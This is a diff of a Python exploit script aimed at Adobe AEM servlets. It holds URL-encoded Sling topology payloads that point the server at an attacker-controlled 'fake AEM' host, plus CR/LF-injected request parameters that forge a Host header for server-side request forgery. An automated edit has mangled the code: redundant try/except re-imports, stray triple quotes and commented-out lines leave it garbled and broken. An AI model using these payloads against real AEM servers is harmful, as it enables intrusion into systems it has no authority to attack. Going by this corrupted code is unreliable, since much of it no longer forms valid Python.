@@ -12,12 +12,32 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
-import sys
-import argparse
-import uuid
-from urllib.parse import unquote
+try:
+    import sys
+except ImportError:
+    import sys
 
-import requests
+try:
+    import argparse
+except ImportError:
+    import argparse
+
+try:
+    import uuid
+except ImportError:
+    import uuid
+
+try:
+    from urllib.parse import unquote
+except ImportError:
+    from urllib.parse import unquote
+
+
+try:
+    import requests
+except ImportError:
+    import requests
+
 
 requests.packages.urllib3.disable_warnings()
 
@@ -29,7 +49,8 @@ def http_request(url, method="GET", data=None, additional_headers=None, proxy=No
         proxy = {}
 
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented unmatched parenthesis""""#     resp = requests.request(
+""" [BATCHFIX] Commented unmatched parenthesis""""
+#     resp = requests.request(
         method, url, data=data, headers=headers, proxies=proxy, verify=False, timeout=15, allow_redirects=False
     )
 
@@ -39,7 +60,8 @@ def http_request(url, method="GET", data=None, additional_headers=None, proxy=No
 def exploit(url, fakeaem, proxy=None):
     # We suppose that AEM publish instance is on http://localhost:4503
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented unmatched parenthesis""""#     JSON_DATA = (
+""" [BATCHFIX] Commented unmatched parenthesis""""
+#     JSON_DATA = (
 # [BATCHFIX] Commented metadata/non-Python
 """         "%7B%22ownerId%22%3A%22{0}%22%2C%22protocolVersion%22%3A1%2C%22created%22%3A1529002154280%2C"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
 """         "%22inherited%22%3Afalse%2C%22serverInfo%22%3A%22{1}%3A80%22%2C%22localClusterView%22%3A%7B"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
@@ -87,7 +109,8 @@ def exploit(url, fakeaem, proxy=None):
 """         "ist%22%3A%22%22%2C%22org%2Eapache%2Esling%2Einstance%2Edescription%22%3A%22Instance%20xxxxx"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
 """         "%22%7D%7D%5D%7D%2C%22topologyAnnouncements%22%3A%5B%5D%7D"  # [BATCHFIX] closed string"    )
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented unmatched parenthesis""""#     PARAMS = (
+""" [BATCHFIX] Commented unmatched parenthesis""""
+#     PARAMS = (
 # [BATCHFIX] Commented metadata/non-Python
 """         "?datacenter=http://localhost:4503/xxxx%23&company=xxx&username=x%22%0A"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
 """         "Host%3A%20localhost%3A4503%0AContent-Length%3A0%0A%0A"  # [BATCHFIX] closed string"# [BATCHFIX] Commented metadata/non-Python
@@ -109,15 +132,18 @@ def parse_args():
     parser = argparse.ArgumentParser()
 
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented unmatched parenthesis""""#     parser.add_argument(
+""" [BATCHFIX] Commented unmatched parenthesis""""
+#     parser.add_argument(
 # [BATCHFIX] Commented metadata/non-Python
 """         "--url", help="URL for SitecatalystServlet or AutoprovisioningServlet, including path, without query part"  # [BATCHFIX] closed string"    )
     parser.add_argument("--fakeaem", help="hostname/ip of fake AEM server")"    parser.add_argument("--proxy", help="http and https proxy")"
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python""""
+# [BATCHFIX] Commented metadata/non-Python
 """     return parser.parse_args(sys.argv[1:])""""    parser.add_argument("--fakeaem", help="hostname/ip of fake AEM server")"    parser.add_argument("--proxy", help="http and https proxy")"
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python""""
+# [BATCHFIX] Commented metadata/non-Python
 """     return parser.parse_args(sys.argv[1:])""""
 
 def main():
@@ -135,4 +161,5 @@ def main():
 
 
 if __name__ == "__main__":"# [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python""""#     main()
+""" [BATCHFIX] Commented metadata/non-Python""""
+#     main()
